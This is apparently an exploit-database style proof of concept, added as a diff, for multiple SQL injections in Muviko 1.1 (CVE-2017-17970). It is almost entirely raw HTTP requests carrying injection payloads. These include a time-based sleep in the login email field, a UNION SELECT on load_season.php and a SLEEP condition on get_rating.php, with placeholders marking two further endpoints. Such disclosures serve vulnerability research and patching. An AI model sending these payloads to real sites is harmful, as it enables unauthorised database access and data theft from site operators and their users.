@@ -1,0 +1,148 @@
+# Exploit Title: Muviko 1.1 - Multiple SQL Injection
+# Exploit Author: Ahmad Mahfouz 
+# Contact: http://twitter.com/eln1x
+# Date: 09/01/2018
+# CVE: CVE-2017-17970
+# Vendor Homepage: https://www.muvikoscript.com
+# Version: 1.1
+# Tested on: Mac OS
+
+ 
+
+ 
+
+--------------------------------------------------------------------------------------------------------
+
+# SQL Injection: login.php form parameter [POST] email
+
+ 
+
+POST /login.php HTTP/1.1
+
+Host: localhost
+
+User-Agent: Mozilla/5.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Cookie: PHPSESSID=rrnaq7ssxxxxx9g6b7jd7415
+
+Connection: close
+
+Upgrade-Insecure-Requests: 1
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 45
+
+ 
+
+email=admin@dmin.com'%2b(select*from(select(sleep(20)))a)%2b'&password=admxn&login=
+
+ 
+
+--------------------------------------------------------------------------------------------------------
+
+# SQL Injection: load_season.php form parameter [GET] season_id
+
+ 
+
+GET /themes/flixer/ajax/load_season.php?season_id=-19'+union+all+select+1,2,3,4,5,6,7,8,9--+-&season_number=1 HTTP/1.1
+
+Host: localhost
+
+User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+X-Requested-With: XMLHttpRequest
+
+Cookie: PHPSESSID=rrnaq7ssxxxxx9g6b7jd7415
+
+Connection: close
+
+ 
+
+--------------------------------------------------------------------------------------------------------
+
+ 
+
+# SQL Injection get_raring.php parameter [GET] movie_id
+
+ 
+
+GET /themes/flixer/ajax/get_rating.php?movie_id=9'+AND+SLEEP(5)+AND+'AAA'='AAA HTTP/1.1
+
+Host: localhost
+
+User-Agent: Mozilla/5.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+X-Requested-With: XMLHttpRequest
+
+Cookie: PHPSESSID=rrnaq7ssxxxxx9g6b7jd7415
+
+Connection: close
+
+ 
+
+--------------------------------------------------------------------------------------------------------
+
+# SQL Injection update_rating.php parameters [GET] rating,movie_id
+
+ 
+
+GET /themes/flixer/ajax/update_rating.php?movie_id=[SQL]&rating=[SQL] HTTP/1.1
+
+Host: localhost
+
+User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+X-Requested-With: XMLHttpRequest
+
+Cookie: PHPSESSID=rrnaq7ssxxxxx9g6b7jd7415
+
+Connection: close
+
+ 
+
+--------------------------------------------------------------------------------------------------------
+
+# SQL Injection set_player_source.php parameters [GET] id
+
+GET /themes/flixer/ajax/set_player_source.php?id=[SQL]&is_series=1&is_embed=0 HTTP/1.1
+
+Host: localhost
+
+User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+X-Requested-With: XMLHttpRequest
+
+Cookie: PHPSESSID=rrnaq7ssxxxxx9g6b7jd7415
+
+Connection: close
